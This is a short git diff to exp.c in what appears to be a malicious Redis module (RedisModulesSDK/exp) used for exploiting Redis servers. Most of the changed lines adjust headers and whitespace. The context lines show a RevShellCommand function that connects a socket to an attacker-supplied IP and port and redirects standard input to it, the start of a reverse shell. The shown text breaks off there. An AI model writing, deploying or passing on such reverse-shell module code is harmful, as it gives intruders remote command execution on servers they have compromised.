@@ -1,0 +1,35 @@
+diff --git a/RedisModulesSDK/exp/exp.c b/RedisModulesSDK/exp/exp.c
+index cfeb95e..dc9bffc 100644
+--- a/RedisModulesSDK/exp/exp.c
++++ b/RedisModulesSDK/exp/exp.c
+@@ -1,13 +1,16 @@
+ #include "redismodule.h"
+ 
+-#include <stdio.h> 
+-#include <unistd.h>  
+-#include <stdlib.h> 
+-#include <errno.h>   
++#include <arpa/inet.h>
++#include <stdio.h>
++#include <unistd.h>
++#include <stdlib.h>
++#include <errno.h>
+ #include <sys/wait.h>
+-#include <sys/types.h> 
++#include <sys/types.h>
+ #include <sys/socket.h>
+ #include <netinet/in.h>
++#include <string.h>
++
+ 
+ int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
+ 	if (argc == 2) {
+@@ -47,7 +50,7 @@ int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
+ 		sa.sin_family = AF_INET;
+ 		sa.sin_addr.s_addr = inet_addr(ip);
+ 		sa.sin_port = htons(port);
+-		
++
+ 		s = socket(AF_INET, SOCK_STREAM, 0);
+ 		connect(s, (struct sockaddr *)&sa, sizeof(sa));
+ 		dup2(s, 0);
